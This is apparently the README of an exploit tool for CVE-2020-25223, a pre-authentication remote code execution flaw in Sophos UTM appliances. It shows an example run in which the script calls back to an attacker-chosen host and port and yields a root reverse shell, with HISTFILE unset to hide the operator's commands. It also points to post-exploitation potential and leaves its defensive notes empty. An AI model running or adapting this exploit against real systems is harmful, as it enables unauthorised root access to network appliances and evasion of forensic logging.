# sophucked
CVE-2020-25223 RCE PoC, gets reverse shell. Pre-auth. Implemented this quickly as it was needed.


## Example Use:
```
# python sophucked.py https://x.x.x.x:4443 x.x.x.x 80
(+) starting handler on port 80
(+) Sending callback to x.x.x.x:80
(+) connection from x.x.x.x
(+) pop thy shell!
bash: no job control in this shell
utm:/var/confd # unset HISTFILE
unset HISTFILE
utm:/var/confd # id
id
uid=0(root) gid=0(root) groups=0(root)
utm:/var/confd # exit
exit
exit
*** Connection closed by remote host ***
# 
```

## Scanning/Detection
Not implemented in this, just use the [nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-25223.yaml).

## Post-exploitation notes
These have a python interpreter, and actually a very fully featured Linux environment available. Amazing potential for post-exploitation. 

## Blue team notes
I'm sure someone who cares can fill this in.

Third party reference (bug details): https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223
